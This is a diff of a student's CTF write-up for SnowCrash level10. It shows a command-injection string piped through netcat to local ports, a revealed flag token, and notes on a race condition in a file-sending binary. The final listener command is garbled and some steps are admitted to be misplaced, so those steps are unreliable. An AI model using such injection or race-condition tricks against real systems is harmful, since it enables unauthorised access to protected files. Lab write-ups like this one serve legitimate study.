@@ -27,7 +27,9 @@ level10@SnowCrash:~$ ./level10 token
 level10@SnowCrash:~$ cat token
 cat: token: Permission denied
 
-# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
+#	It we run strings on level10 we see that it uses port 6969
+
+# Lets see if we can exploit it with echo and using nc with our port 5151,  and give us the password too and 6969 only gives the flag
 #	Note localhost 5151 is home in networking
 echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
 
@@ -35,15 +37,18 @@ level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && 
 Password: Erf nope..
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
-level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-
-# OOPS this did not work. when I enter the password it did not work
+# OOPS this did not work. when I enter the password it did not work		## Side note this was level11 exploit as I found out when I completed level11
 
 # 	Okay but it wasn't a complete waste and we show that we are on the correct path and we need to use port 6969 instead
 
-We decompile on an online tool, and we realize that there is a race condition: If between the call to access and the call to open, 
-the file named by argv [1] changes, we can read an arbitrary file.
+# Lets run it one more time
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it ## This is the key giveaway!
+
+#	It is expecting that the client to be listing privor to running `./level10`.
+#	The problem is nc expects the sever to be running privor to the client connecting 
+#		Hence there is a race condition between the two.
 
 # So we open a shell on which we listen in loop with the following command:
 #	while [42]; do nc-1 6969; therefore
